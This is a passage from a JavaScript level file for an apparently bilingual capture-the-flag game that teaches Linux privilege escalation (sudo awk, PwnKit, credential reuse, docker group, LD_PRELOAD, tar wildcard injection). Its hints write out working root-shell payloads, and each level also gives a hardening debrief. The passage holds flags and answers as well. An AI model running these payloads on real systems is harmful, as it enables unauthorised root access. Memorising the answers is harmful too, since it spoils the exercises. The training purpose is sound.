            en: ['Check your sudo permissions', 'Recognise the GTFOBins-listed binary', 'Spawn a root shell from it'],
            fr: ['Vérifier tes droits sudo', 'Reconnaître le binaire listé sur GTFOBins', 'En faire jaillir un shell root']
        },
        hints: {
            en: [
                'Try: sudo -l',
                'awk can run arbitrary commands with its BEGIN block. Check GTFOBins for "awk".',
                'Payload: sudo awk \'BEGIN{system("/bin/sh")}\''
            ],
            fr: [
                'Essaie : sudo -l',
                'awk peut exécuter des commandes via son bloc BEGIN. Regarde GTFOBins pour "awk".',
                'Payload : sudo awk \'BEGIN{system("/bin/sh")}\''
            ]
        },
        flag: 'flag{sud0_awk_sh3ll}',
        fs: {
            '/': { type: 'dir', owner: 'root', mode: '755', children: ['home', 'etc', 'usr', 'tmp', 'var', 'root', 'bin'] },
            '/home': { type: 'dir', owner: 'root', mode: '755', children: ['player'] },
            '/home/player': { type: 'dir', owner: 'player', mode: '755', children: ['.bashrc'] },
            '/home/player/.bashrc': { type: 'file', owner: 'player', mode: '644', content: '# ~/.bashrc\n' },
            '/etc': { type: 'dir', owner: 'root', mode: '755', children: ['passwd', 'sudoers'] },
            '/etc/passwd': { type: 'file', owner: 'root', mode: '644', content: 'root:x:0:0:root:/root:/bin/bash\nplayer:x:1000:1000:player:/home/player:/bin/bash\n' },
            '/etc/sudoers': { type: 'file', owner: 'root', mode: '440', content: 'ACCESS DENIED' },
            '/root': { type: 'dir', owner: 'root', mode: '700', children: ['flag.txt'] },
            '/root/flag.txt': { type: 'file', owner: 'root', mode: '600', content: 'flag{sud0_awk_sh3ll}\n' },
            '/usr': { type: 'dir', owner: 'root', mode: '755', children: ['bin'] },
            '/usr/bin': { type: 'dir', owner: 'root', mode: '755', children: ['ls', 'cat', 'sh', 'bash', 'sudo', 'awk'] },
            '/usr/bin/ls': { type: 'file', owner: 'root', mode: '755', content: 'ELF binary' },
            '/usr/bin/cat': { type: 'file', owner: 'root', mode: '755', content: 'ELF binary' },
            '/usr/bin/sh': { type: 'file', owner: 'root', mode: '755', content: 'ELF binary' },
            '/usr/bin/bash': { type: 'file', owner: 'root', mode: '755', content: 'ELF binary' },
            '/usr/bin/sudo': { type: 'file', owner: 'root', mode: '4755', suid: true, content: 'ELF binary' },
            '/usr/bin/awk': { type: 'file', owner: 'root', mode: '755', content: 'ELF binary' },
            '/tmp': { type: 'dir', owner: 'root', mode: '1777', children: [] },
            '/var': { type: 'dir', owner: 'root', mode: '755', children: [] },
            '/bin': { type: 'dir', owner: 'root', mode: '755', children: ['sh'] },
            '/bin/sh': { type: 'file', owner: 'root', mode: '755', content: 'ELF binary' }
        },
        sudoers: {
            player: [
                { cmd: '/usr/bin/awk', nopasswd: true, runas: 'root' }
            ]
        },
        wins: [
            { type: 'sudo_shell' }
        ],
        debrief: {
            en: {
                vuln: 'Sudoers misconfiguration — NOPASSWD on awk',
                why: "'player' could run awk as root. awk's BEGIN{system(...)} executes arbitrary shell commands, inheriting sudo's root privileges — an instant root shell, exactly like vim, less, find, env and dozens more on GTFOBins.",
                fix: 'Never grant sudo on general-purpose interpreters or text tools. Restrict sudo rules to specific, non-shelling binaries with fixed arguments, and cross-check every allowed command against GTFOBins.',
                link: 'https://gtfobins.github.io/gtfobins/awk/'
            },
            fr: {
                vuln: 'Mauvaise config sudoers — NOPASSWD sur awk',
                why: "'player' pouvait lancer awk en root. Le bloc BEGIN{system(...)} d'awk exécute des commandes shell arbitraires en héritant des droits root de sudo — un shell root immédiat, comme vim, less, find, env et des dizaines d'autres sur GTFOBins.",
                fix: 'Ne jamais donner sudo sur un interpréteur ou un outil texte généraliste. Restreins les règles sudo à des binaires précis, non-shellants, avec arguments figés, et vérifie chaque commande autorisée sur GTFOBins.',
                link: 'https://gtfobins.github.io/gtfobins/awk/'
            }
        }
    },

    // ─────────────────────────────────────────────────────────────
    // LEVEL 8 — Simulated kernel exploit (PwnKit / CVE-2021-4034)
    // ─────────────────────────────────────────────────────────────
    {
        id: 8,
        codename: 'box-08',
        title: { en: 'Box-08 · Kernel Panic Room', fr: 'Box-08 · La salle du kernel' },
        brief: {
            en: 'No SUID, no sudo, no caps. But the system is old and a public PoC is sitting in your home. Some vulns are in the software itself.',
            fr: 'Pas de SUID, pas de sudo, pas de caps. Mais le système est vieux et un PoC public traîne dans ton home. Certaines failles sont dans le logiciel lui-même.'
        },
        user: 'player',
        host: 'box-08',
        cwd: '/home/player',
        objectives: {
            en: ['Note the outdated system / pkexec version', 'Locate the exploit PoC', 'Run it to get root'],
            fr: ['Repérer le système / pkexec obsolète', 'Localiser le PoC de l\'exploit', 'L\'exécuter pour obtenir root']
        },
        hints: {
            en: [
                'Read HINT.txt and note the polkit/pkexec version — CVE-2021-4034 (PwnKit) affects it.',
                'There is a compiled PoC in your home directory: ls -la',
                'Run it: ./pwnkit'
            ],
            fr: [
                'Lis HINT.txt et note la version de polkit/pkexec — CVE-2021-4034 (PwnKit) la touche.',
                'Un PoC compilé traîne dans ton home : ls -la',
                'Lance-le : ./pwnkit'
            ]
        },
        flag: 'flag{pwnk1t_cve_2021_4034}',
        fs: {
            '/': { type: 'dir', owner: 'root', mode: '755', children: ['home', 'etc', 'usr', 'tmp', 'var', 'root', 'bin'] },
            '/home': { type: 'dir', owner: 'root', mode: '755', children: ['player'] },
            '/home/player': { type: 'dir', owner: 'player', mode: '755', children: ['.bashrc', 'HINT.txt', 'pwnkit'] },
            '/home/player/.bashrc': { type: 'file', owner: 'player', mode: '644', content: '# ~/.bashrc\n' },
            '/home/player/HINT.txt': { type: 'file', owner: 'player', mode: '644', content: 'SUID/sudo/caps audit: clean.\nBut check the software versions:\n  $ pkexec --version  ->  pkexec version 0.105\nThat build predates the CVE-2021-4034 (PwnKit) fix.\nA precompiled PoC (./pwnkit) is in this directory.\n' },
            '/home/player/pwnkit': { type: 'file', owner: 'player', mode: '755', exploit: 'kernel_exploit', content: 'ELF 64-bit LSB executable, x86-64 — CVE-2021-4034 (pwnkit) local root PoC' },
            '/etc': { type: 'dir', owner: 'root', mode: '755', children: ['passwd', 'os-release'] },
            '/etc/passwd': { type: 'file', owner: 'root', mode: '644', content: 'root:x:0:0:root:/root:/bin/bash\nplayer:x:1000:1000:player:/home/player:/bin/bash\n' },
            '/etc/os-release': { type: 'file', owner: 'root', mode: '644', content: 'PRETTY_NAME="Ubuntu 18.04.1 LTS"\nVERSION_ID="18.04"\n' },
            '/root': { type: 'dir', owner: 'root', mode: '700', children: ['flag.txt'] },
            '/root/flag.txt': { type: 'file', owner: 'root', mode: '600', content: 'flag{pwnk1t_cve_2021_4034}\n' },
            '/usr': { type: 'dir', owner: 'root', mode: '755', children: ['bin'] },
            '/usr/bin': { type: 'dir', owner: 'root', mode: '755', children: ['ls', 'cat', 'sh', 'bash', 'pkexec'] },
            '/usr/bin/ls': { type: 'file', owner: 'root', mode: '755', content: 'ELF binary' },
            '/usr/bin/cat': { type: 'file', owner: 'root', mode: '755', content: 'ELF binary' },
            '/usr/bin/sh': { type: 'file', owner: 'root', mode: '755', content: 'ELF binary' },
            '/usr/bin/bash': { type: 'file', owner: 'root', mode: '755', content: 'ELF binary' },
            '/usr/bin/pkexec': { type: 'file', owner: 'root', mode: '4755', suid: true, content: 'ELF binary (polkit 0.105)' },
            '/tmp': { type: 'dir', owner: 'root', mode: '1777', children: [] },
            '/var': { type: 'dir', owner: 'root', mode: '755', children: [] },
            '/bin': { type: 'dir', owner: 'root', mode: '755', children: ['sh'] },
            '/bin/sh': { type: 'file', owner: 'root', mode: '755', content: 'ELF binary' }
        },
        wins: [
            { type: 'kernel_exploit' }
        ],
        harden: {
            type: 'unset_suid', target: '/usr/bin/pkexec',
            obj: { en: 'Drop the SUID bit from the vulnerable pkexec', fr: 'Retire le bit SUID du pkexec vulnérable' },
            hint: { en: 'chmod u-s /usr/bin/pkexec', fr: 'chmod u-s /usr/bin/pkexec' }
        },
        debrief: {
            en: {
                vuln: 'Unpatched local privilege escalation (CVE-2021-4034, PwnKit)',
                why: 'pkexec from polkit 0.105 mishandles argument count, letting a local user execute code as root. When SUID/sudo/caps are all clean, an out-of-date, vulnerable component is the way in — patch level is part of the attack surface.',
                fix: 'Patch and keep systems up to date (apt upgrade). Track advisories for SUID components like pkexec/polkit. As a stopgap, remove the SUID bit from pkexec until patched, and monitor for known-exploit binaries dropped in home/tmp.',
                link: 'https://www.qualys.com/2022/01/25/cve-2021-4034/pwnkit.txt'
            },
            fr: {
                vuln: 'Élévation de privilèges non corrigée (CVE-2021-4034, PwnKit)',
                why: 'pkexec de polkit 0.105 gère mal le nombre d\'arguments, permettant à un utilisateur local d\'exécuter du code en root. Quand SUID/sudo/caps sont propres, c\'est un composant obsolète et vulnérable qui devient la porte d\'entrée — le niveau de patch fait partie de la surface d\'attaque.',
                fix: 'Patche et tiens les systèmes à jour (apt upgrade). Suis les avis de sécurité des composants SUID comme pkexec/polkit. En dépannage, retire le bit SUID de pkexec en attendant, et surveille les binaires d\'exploit connus déposés dans home/tmp.',
                link: 'https://www.qualys.com/2022/01/25/cve-2021-4034/pwnkit.txt'
            }
        }
    },

    // ─────────────────────────────────────────────────────────────
    // LEVEL 9 — Credential reuse → lateral move → sudo (multi-step)
    // ─────────────────────────────────────────────────────────────
    {
        id: 9,
        codename: 'box-09',
        title: { en: 'Box-09 · Leftover Credentials', fr: 'Box-09 · Les identifiants oubliés' },
        brief: {
            en: 'A plaintext password is rotting in a config file. It belongs to a service account — and that account was given too much sudo. Chain it.',
            fr: 'Un mot de passe en clair pourrit dans un fichier de conf. Il appartient à un compte de service — à qui on a donné trop de sudo. Enchaîne.'
        },
        user: 'player',
        host: 'box-09',
        cwd: '/home/player',
        objectives: {
            en: ['Enumerate readable files under /opt', 'Recover the service credentials', 'su to that account and abuse its sudo rights'],
            fr: ['Énumérer les fichiers lisibles sous /opt', 'Récupérer les identifiants du service', 'su vers ce compte et abuser de ses droits sudo']
        },
        hints: {
            en: [
                'Look in the web app config: cat /opt/app/config.php — note the DB user and password.',
                'That password is reused for the "svc" login. Switch to it: su svc',
                'As svc, check sudo -l — you can run bash as root: sudo bash'
            ],
            fr: [
                'Regarde la conf de l\'app web : cat /opt/app/config.php — note l\'utilisateur et le mot de passe DB.',
                'Ce mot de passe est réutilisé pour le compte "svc". Bascule dessus : su svc',
                'En svc, regarde sudo -l — tu peux lancer bash en root : sudo bash'
            ]
        },
        flag: 'flag{cr3d_reuse_l4teral}',
        fs: {
            '/': { type: 'dir', owner: 'root', mode: '755', children: ['home', 'etc', 'usr', 'tmp', 'var', 'root', 'opt', 'bin'] },
            '/home': { type: 'dir', owner: 'root', mode: '755', children: ['player', 'svc'] },
            '/home/player': { type: 'dir', owner: 'player', mode: '755', children: ['.bashrc'] },
            '/home/player/.bashrc': { type: 'file', owner: 'player', mode: '644', content: '# ~/.bashrc\n' },
            '/home/svc': { type: 'dir', owner: 'svc', mode: '755', children: ['.bashrc'] },
            '/home/svc/.bashrc': { type: 'file', owner: 'svc', mode: '644', content: '# svc account\n' },
            '/etc': { type: 'dir', owner: 'root', mode: '755', children: ['passwd', 'sudoers'] },
            '/etc/passwd': { type: 'file', owner: 'root', mode: '644', content: 'root:x:0:0:root:/root:/bin/bash\nplayer:x:1000:1000:player:/home/player:/bin/bash\nsvc:x:1001:1001:service account:/home/svc:/bin/bash\n' },
            '/etc/sudoers': { type: 'file', owner: 'root', mode: '440', content: 'ACCESS DENIED' },
            '/root': { type: 'dir', owner: 'root', mode: '700', children: ['flag.txt'] },
            '/root/flag.txt': { type: 'file', owner: 'root', mode: '600', content: 'flag{cr3d_reuse_l4teral}\n' },
            '/opt': { type: 'dir', owner: 'root', mode: '755', children: ['app'] },
            '/opt/app': { type: 'dir', owner: 'root', mode: '755', children: ['config.php'] },
            '/opt/app/config.php': { type: 'file', owner: 'root', mode: '644', content:
`<?php
// DB connection — TODO: move secrets out of source control
$db_host = "127.0.0.1";
$db_user = "svc";
$db_pass = "S3rv!ce_2024";   // NOTE: svc reuses this for the system login too
?>
` },
            '/usr': { type: 'dir', owner: 'root', mode: '755', children: ['bin'] },
            '/usr/bin': { type: 'dir', owner: 'root', mode: '755', children: ['ls', 'cat', 'sh', 'bash', 'sudo', 'su'] },
            '/usr/bin/ls': { type: 'file', owner: 'root', mode: '755', content: 'ELF binary' },
            '/usr/bin/cat': { type: 'file', owner: 'root', mode: '755', content: 'ELF binary' },
            '/usr/bin/sh': { type: 'file', owner: 'root', mode: '755', content: 'ELF binary' },
            '/usr/bin/bash': { type: 'file', owner: 'root', mode: '755', content: 'ELF binary' },
            '/usr/bin/sudo': { type: 'file', owner: 'root', mode: '4755', suid: true, content: 'ELF binary' },
            '/usr/bin/su': { type: 'file', owner: 'root', mode: '4755', suid: true, content: 'ELF binary' },
            '/tmp': { type: 'dir', owner: 'root', mode: '1777', children: [] },
            '/var': { type: 'dir', owner: 'root', mode: '755', children: [] },
            '/bin': { type: 'dir', owner: 'root', mode: '755', children: ['sh'] },
            '/bin/sh': { type: 'file', owner: 'root', mode: '755', content: 'ELF binary' }
        },
        sudoers: {
            svc: [
                { cmd: '/usr/bin/bash', nopasswd: true, runas: 'root' }
            ]
        },
        wins: [
            { type: 'sudo_shell' }
        ],
        debrief: {
            en: {
                vuln: 'Credential reuse + over-privileged service account',
                why: 'A plaintext password sat in a world-readable config file. The svc account reused it for its system login, and svc was allowed to run bash via sudo. Chaining enumeration → lateral move → sudo abuse turns one leaked secret into full root.',
                fix: 'Keep secrets out of source and world-readable files (use a vault / env with tight perms). Enforce unique credentials per service, and scope sudo to the minimum — never grant sudo on a shell.',
                link: 'https://book.hacktricks.xyz/linux-hardening/privilege-escalation'
            },
            fr: {
                vuln: 'Réutilisation d\'identifiants + compte de service sur-privilégié',
                why: 'Un mot de passe en clair traînait dans un fichier de conf lisible par tous. Le compte svc le réutilisait pour son login système, et svc pouvait lancer bash via sudo. Enchaîner énumération → mouvement latéral → abus de sudo transforme un secret fuité en root complet.',
                fix: 'Garde les secrets hors du code et des fichiers lisibles par tous (coffre-fort / env aux droits stricts). Impose des identifiants uniques par service, et restreins sudo au minimum — jamais sudo sur un shell.',
                link: 'https://book.hacktricks.xyz/linux-hardening/privilege-escalation'
            }
        }
    },

    // ─────────────────────────────────────────────────────────────
    // LEVEL 10 — Docker group membership
    // ─────────────────────────────────────────────────────────────
    {
        id: 10,
        codename: 'box-10',
        title: { en: 'Box-10 · Whale of a Privilege', fr: 'Box-10 · Une baleine de privilèges' },
        brief: {
            en: 'You are in the "docker" group. That is effectively root — you can mount the host filesystem inside a container you control.',
            fr: 'Tu es dans le groupe "docker". C\'est root en pratique — tu peux monter le système hôte dans un conteneur que tu contrôles.'
        },
        user: 'player',
        host: 'box-10',
        cwd: '/home/player',
        objectives: {
            en: ['Confirm your group membership', 'Run a container that mounts the host root', 'chroot into it as root'],
            fr: ['Confirmer ton appartenance au groupe', 'Lancer un conteneur qui monte la racine hôte', 'chroot dedans en root']
        },
        hints: {
            en: [
                'Check your groups: id — being in "docker" is a known privesc.',
                'A container can bind-mount the whole host: -v /:/mnt',
                'Payload: docker run -v /:/mnt -it alpine chroot /mnt sh'
            ],
            fr: [
                'Vérifie tes groupes : id — être dans "docker" est un privesc connu.',
                'Un conteneur peut monter tout l\'hôte : -v /:/mnt',
                'Payload : docker run -v /:/mnt -it alpine chroot /mnt sh'
            ]
        },
        flag: 'flag{d0cker_group_pwn}',
        fs: {
            '/': { type: 'dir', owner: 'root', mode: '755', children: ['home', 'etc', 'usr', 'tmp', 'var', 'root', 'bin'] },
            '/home': { type: 'dir', owner: 'root', mode: '755', children: ['player'] },
            '/home/player': { type: 'dir', owner: 'player', mode: '755', children: ['.bashrc'] },
            '/home/player/.bashrc': { type: 'file', owner: 'player', mode: '644', content: '# ~/.bashrc\n' },
            '/etc': { type: 'dir', owner: 'root', mode: '755', children: ['passwd', 'group'] },
            '/etc/passwd': { type: 'file', owner: 'root', mode: '644', content: 'root:x:0:0:root:/root:/bin/bash\nplayer:x:1000:1000:player:/home/player:/bin/bash\n' },
            '/etc/group': { type: 'file', owner: 'root', mode: '644', content: 'root:x:0:\ndocker:x:999:player\nplayer:x:1000:\n' },
            '/root': { type: 'dir', owner: 'root', mode: '700', children: ['flag.txt'] },
            '/root/flag.txt': { type: 'file', owner: 'root', mode: '600', content: 'flag{d0cker_group_pwn}\n' },
            '/usr': { type: 'dir', owner: 'root', mode: '755', children: ['bin'] },
            '/usr/bin': { type: 'dir', owner: 'root', mode: '755', children: ['ls', 'cat', 'sh', 'bash', 'docker', 'id'] },
            '/usr/bin/ls': { type: 'file', owner: 'root', mode: '755', content: 'ELF binary' },
            '/usr/bin/cat': { type: 'file', owner: 'root', mode: '755', content: 'ELF binary' },
            '/usr/bin/sh': { type: 'file', owner: 'root', mode: '755', content: 'ELF binary' },
            '/usr/bin/bash': { type: 'file', owner: 'root', mode: '755', content: 'ELF binary' },
            '/usr/bin/docker': { type: 'file', owner: 'root', mode: '755', content: 'ELF binary (docker client)' },
            '/usr/bin/id': { type: 'file', owner: 'root', mode: '755', content: 'ELF binary' },
            '/var': { type: 'dir', owner: 'root', mode: '755', children: ['run'] },
            '/var/run': { type: 'dir', owner: 'root', mode: '755', children: ['docker.sock'] },
            '/var/run/docker.sock': { type: 'file', owner: 'root', mode: '660', content: 'unix socket' },
            '/tmp': { type: 'dir', owner: 'root', mode: '1777', children: [] },
            '/bin': { type: 'dir', owner: 'root', mode: '755', children: ['sh'] },
            '/bin/sh': { type: 'file', owner: 'root', mode: '755', content: 'ELF binary' }
        },
        wins: [
            { type: 'docker_sock' }
        ],
        debrief: {
            en: {
                vuln: 'Membership of the docker group',
                why: 'The docker group grants full control of the Docker daemon, which runs as root. Mounting the host filesystem into a container (-v /:/mnt) and chrooting into it gives an unrestricted root shell on the host. docker group ≈ root.',
                fix: 'Treat docker group membership as equivalent to root and grant it only to trusted admins. Prefer rootless Docker or fine-grained tooling, and audit who is in docker/lxd/kvm groups.',
                link: 'https://book.hacktricks.xyz/linux-hardening/privilege-escalation/interesting-groups-linux-pe/docker-security'
            },
            fr: {
                vuln: 'Appartenance au groupe docker',
                why: 'Le groupe docker donne le contrôle total du démon Docker, qui tourne en root. Monter le système hôte dans un conteneur (-v /:/mnt) puis chrooter dedans donne un shell root sans restriction sur l\'hôte. groupe docker ≈ root.',
                fix: 'Considère l\'appartenance au groupe docker comme équivalente à root et ne l\'accorde qu\'à des admins de confiance. Préfère Docker rootless ou un outillage granulaire, et audite qui est dans les groupes docker/lxd/kvm.',
                link: 'https://book.hacktricks.xyz/linux-hardening/privilege-escalation/interesting-groups-linux-pe/docker-security'
            }
        }
    },

    // ─────────────────────────────────────────────────────────────
    // LEVEL 11 — LD_PRELOAD via sudo env_keep
    // ─────────────────────────────────────────────────────────────
    {
        id: 11,
        codename: 'box-11',
        title: { en: 'Box-11 · Preload Pandemonium', fr: 'Box-11 · Chaos au préchargement' },
        brief: {
            en: 'sudo lets you run one harmless-looking binary as root — but it also kept LD_PRELOAD in the environment. Load your own library.',
            fr: 'sudo t\'autorise un binaire d\'apparence inoffensive en root — mais il a aussi gardé LD_PRELOAD dans l\'environnement. Charge ta propre bibliothèque.'
        },
        user: 'player',
        host: 'box-11',
        cwd: '/home/player',
        objectives: {
            en: ['Read your sudo rights and spot env_keep', 'Build a shared object that spawns a shell', 'Preload it through sudo'],
            fr: ['Lire tes droits sudo et repérer env_keep', 'Construire un objet partagé qui ouvre un shell', 'Le précharger via sudo']
        },
        hints: {
            en: [
                'Run sudo -l — note "env_keep+=LD_PRELOAD" and the NOPASSWD command you may run.',
                'Write a tiny library whose _init() runs setuid(0); system("/bin/sh"), then compile it:\n  echo \'void _init(){setuid(0);system("/bin/sh");}\' > /tmp/x.c\n  gcc -shared -fPIC -nostartfiles -o /tmp/x.so /tmp/x.c',
                'Preload it through the sudo-allowed command:\n  sudo LD_PRELOAD=/tmp/x.so apache2ctl'
            ],
            fr: [
                'Lance sudo -l — repère "env_keep+=LD_PRELOAD" et la commande NOPASSWD autorisée.',
                'Écris une petite bibliothèque dont _init() fait setuid(0); system("/bin/sh"), puis compile-la :\n  echo \'void _init(){setuid(0);system("/bin/sh");}\' > /tmp/x.c\n  gcc -shared -fPIC -nostartfiles -o /tmp/x.so /tmp/x.c',
                'Précharge-la via la commande autorisée par sudo :\n  sudo LD_PRELOAD=/tmp/x.so apache2ctl'
            ]
        },
        flag: 'flag{ld_pr3load_env_keep}',
        fs: {
            '/': { type: 'dir', owner: 'root', mode: '755', children: ['home', 'etc', 'usr', 'tmp', 'var', 'root', 'bin'] },
            '/home': { type: 'dir', owner: 'root', mode: '755', children: ['player'] },
            '/home/player': { type: 'dir', owner: 'player', mode: '755', children: ['.bashrc', 'notes.txt'] },
            '/home/player/.bashrc': { type: 'file', owner: 'player', mode: '644', content: '# ~/.bashrc\n' },
            '/home/player/notes.txt': { type: 'file', owner: 'player', mode: '644', content: 'Ops left me sudo on apache2ctl "for restarts".\nThe sudoers Defaults line looks unusually permissive.\n' },
            '/etc': { type: 'dir', owner: 'root', mode: '755', children: ['passwd', 'sudoers'] },
            '/etc/passwd': { type: 'file', owner: 'root', mode: '644', content: 'root:x:0:0:root:/root:/bin/bash\nplayer:x:1000:1000:player:/home/player:/bin/bash\n' },
            '/etc/sudoers': { type: 'file', owner: 'root', mode: '440', content: 'ACCESS DENIED' },
            '/root': { type: 'dir', owner: 'root', mode: '700', children: ['flag.txt'] },
            '/root/flag.txt': { type: 'file', owner: 'root', mode: '600', content: 'flag{ld_pr3load_env_keep}\n' },
            '/usr': { type: 'dir', owner: 'root', mode: '755', children: ['bin', 'sbin'] },
            '/usr/bin': { type: 'dir', owner: 'root', mode: '755', children: ['ls', 'cat', 'sh', 'bash', 'sudo', 'gcc'] },
            '/usr/bin/ls': { type: 'file', owner: 'root', mode: '755', content: 'ELF binary' },
            '/usr/bin/cat': { type: 'file', owner: 'root', mode: '755', content: 'ELF binary' },
            '/usr/bin/sh': { type: 'file', owner: 'root', mode: '755', content: 'ELF binary' },
            '/usr/bin/bash': { type: 'file', owner: 'root', mode: '755', content: 'ELF binary' },
            '/usr/bin/sudo': { type: 'file', owner: 'root', mode: '4755', suid: true, content: 'ELF binary' },
            '/usr/bin/gcc': { type: 'file', owner: 'root', mode: '755', content: 'ELF binary' },
            '/usr/sbin': { type: 'dir', owner: 'root', mode: '755', children: ['apache2ctl'] },
            '/usr/sbin/apache2ctl': { type: 'file', owner: 'root', mode: '755', content: '#!/bin/sh\n# apache control wrapper\n' },
            '/tmp': { type: 'dir', owner: 'root', mode: '1777', children: [] },
            '/var': { type: 'dir', owner: 'root', mode: '755', children: [] },
            '/bin': { type: 'dir', owner: 'root', mode: '755', children: ['sh'] },
            '/bin/sh': { type: 'file', owner: 'root', mode: '755', content: 'ELF binary' }
        },
        sudoers: {
            player: [
                { cmd: '/usr/sbin/apache2ctl', nopasswd: true, runas: 'root' }
            ]
        },
        env_keep: ['LD_PRELOAD'],
        wins: [
            { type: 'ld_preload' }
        ],
        debrief: {
            en: {
                vuln: 'sudo env_keep leaves LD_PRELOAD intact',
                why: 'The sudoers Defaults kept LD_PRELOAD in the environment. Even a restricted NOPASSWD command becomes root code execution: a shared object whose _init() runs setuid(0)/system is loaded before the target binary and executes with root privileges.',
                fix: 'Never add LD_PRELOAD / LD_LIBRARY_PATH to env_keep. Rely on the default env_reset, keep sudo command allow-lists tight, and prefer full paths with fixed arguments so dangerous environment variables can never be smuggled in.',
                link: 'https://gtfobins.github.io/gtfobins/'
            },
            fr: {
                vuln: 'sudo env_keep conserve LD_PRELOAD',
                why: 'La directive Defaults de sudoers gardait LD_PRELOAD dans l\'environnement. Même une commande NOPASSWD restreinte devient de l\'exécution de code root : un objet partagé dont _init() fait setuid(0)/system est chargé avant le binaire cible et s\'exécute avec les droits root.',
                fix: 'Ne jamais ajouter LD_PRELOAD / LD_LIBRARY_PATH à env_keep. S\'appuyer sur env_reset par défaut, garder des listes de commandes sudo strictes, et préférer des chemins complets avec arguments figés pour qu\'aucune variable d\'environnement dangereuse ne puisse être injectée.',
                link: 'https://gtfobins.github.io/gtfobins/'
            }
        }
    },

    // ─────────────────────────────────────────────────────────────
    // LEVEL 12 — Wildcard injection (tar --checkpoint in a root cron)
    // ─────────────────────────────────────────────────────────────
    {
        id: 12,
        codename: 'box-12',
        title: { en: 'Box-12 · Wildcard Gone Wild', fr: 'Box-12 · Le joker sauvage' },
        brief: {
            en: 'A root cron archives a directory you can write to, using tar with a "*". Filenames can become tar options. Weaponise the wildcard.',
            fr: 'Un cron root archive un dossier où tu peux écrire, avec tar et un "*". Les noms de fichiers peuvent devenir des options tar. Arme le joker.'
        },
        user: 'player',
        host: 'box-12',
        cwd: '/home/player',
        objectives: {
            en: ['Read the root cron and its tar command', 'Drop a script plus crafted --checkpoint files', 'Wait for cron to run tar as root'],
            fr: ['Lire le cron root et sa commande tar', 'Déposer un script et des fichiers --checkpoint piégés', 'Attendre que cron lance tar en root']
        },
        hints: {
            en: [
                'cat /etc/crontab — root runs: cd /home/player/share && tar -czf /var/backups/share.tar.gz *',
                'The "*" expands to filenames, and tar treats --checkpoint-action=exec=... as an option. Create a payload script first:\n  cd /home/player/share\n  echo \'cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash\' > runme.sh',
                'Now craft the option-filenames (the ./ prefix stops touch treating them as flags) so tar runs your script:\n  touch ./--checkpoint=1\n  touch \'./--checkpoint-action=exec=sh runme.sh\'\n  wait'
            ],
            fr: [
                'cat /etc/crontab — root lance : cd /home/player/share && tar -czf /var/backups/share.tar.gz *',
                'Le "*" est remplacé par les noms de fichiers, et tar interprète --checkpoint-action=exec=... comme une option. Crée d\'abord un script payload :\n  cd /home/player/share\n  echo \'cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash\' > runme.sh',
                'Puis fabrique les fichiers-options (le préfixe ./ empêche touch de les prendre pour des options) pour que tar exécute ton script :\n  touch ./--checkpoint=1\n  touch \'./--checkpoint-action=exec=sh runme.sh\'\n  wait'
            ]
        },
        flag: 'flag{w1ldcard_tar_ch3ckpoint}',
        fs: {
            '/': { type: 'dir', owner: 'root', mode: '755', children: ['home', 'etc', 'usr', 'tmp', 'var', 'root', 'bin'] },
            '/home': { type: 'dir', owner: 'root', mode: '755', children: ['player'] },
            '/home/player': { type: 'dir', owner: 'player', mode: '755', children: ['.bashrc', 'share'] },
            '/home/player/.bashrc': { type: 'file', owner: 'player', mode: '644', content: '# ~/.bashrc\n' },
            '/home/player/share': { type: 'dir', owner: 'player', mode: '755', children: ['report.txt', 'data.csv'] },
            '/home/player/share/report.txt': { type: 'file', owner: 'player', mode: '644', content: 'weekly report\n' },
            '/home/player/share/data.csv': { type: 'file', owner: 'player', mode: '644', content: 'a,b,c\n1,2,3\n' },
            '/etc': { type: 'dir', owner: 'root', mode: '755', children: ['passwd', 'crontab'] },
            '/etc/passwd': { type: 'file', owner: 'root', mode: '644', content: 'root:x:0:0:root:/root:/bin/bash\nplayer:x:1000:1000:player:/home/player:/bin/bash\n' },
            '/etc/crontab': { type: 'file', owner: 'root', mode: '644', content:
`# /etc/crontab: system-wide crontab
SHELL=/bin/sh
PATH=/usr/sbin:/usr/bin:/sbin:/bin

# m h dom mon dow user  command
*  *  *   *   *  root  cd /home/player/share && tar -czf /var/backups/share.tar.gz *
` },
            '/root': { type: 'dir', owner: 'root', mode: '700', children: ['flag.txt'] },
            '/root/flag.txt': { type: 'file', owner: 'root', mode: '600', content: 'flag{w1ldcard_tar_ch3ckpoint}\n' },
            '/usr': { type: 'dir', owner: 'root', mode: '755', children: ['bin'] },
            '/usr/bin': { type: 'dir', owner: 'root', mode: '755', children: ['ls', 'cat', 'sh', 'bash', 'tar', 'touch'] },
            '/usr/bin/ls': { type: 'file', owner: 'root', mode: '755', content: 'ELF binary' },
            '/usr/bin/cat': { type: 'file', owner: 'root', mode: '755', content: 'ELF binary' },
            '/usr/bin/sh': { type: 'file', owner: 'root', mode: '755', content: 'ELF binary' },
            '/usr/bin/bash': { type: 'file', owner: 'root', mode: '755', content: 'ELF binary' },
            '/usr/bin/tar': { type: 'file', owner: 'root', mode: '755', content: 'ELF binary' },
            '/usr/bin/touch': { type: 'file', owner: 'root', mode: '755', content: 'ELF binary' },
            '/var': { type: 'dir', owner: 'root', mode: '755', children: ['backups'] },
            '/var/backups': { type: 'dir', owner: 'root', mode: '755', children: [] },
            '/tmp': { type: 'dir', owner: 'root', mode: '1777', children: [] },
            '/bin': { type: 'dir', owner: 'root', mode: '755', children: ['sh'] },
            '/bin/sh': { type: 'file', owner: 'root', mode: '755', content: 'ELF binary' }
        },
        wins: [
            { type: 'wildcard_tar', dir: '/home/player/share' }
        ],
        debrief: {
            en: {
                vuln: 'Wildcard injection into a root tar cron',
                why: 'root ran tar ... * in a directory you control. The shell expands "*" to the filenames, and tar reads --checkpoint / --checkpoint-action=exec=... as command-line options. Files named after those options make tar execute your script as root.',
                fix: 'Never use unquoted wildcards in privileged scripts. Pass an explicit file list or use "--" and ./ prefixes (tar ... -- *), avoid running archivers over user-writable directories as root, and prefer safe APIs over shell globbing.',
                link: 'https://book.hacktricks.xyz/linux-hardening/privilege-escalation/wildcards-spare-tricks'
            },
            fr: {
                vuln: 'Injection de wildcard dans un cron tar root',
                why: 'root lançait tar ... * dans un dossier que tu contrôles. Le shell remplace "*" par les noms de fichiers, et tar lit --checkpoint / --checkpoint-action=exec=... comme des options. Des fichiers nommés comme ces options font exécuter ton script par tar, en root.',
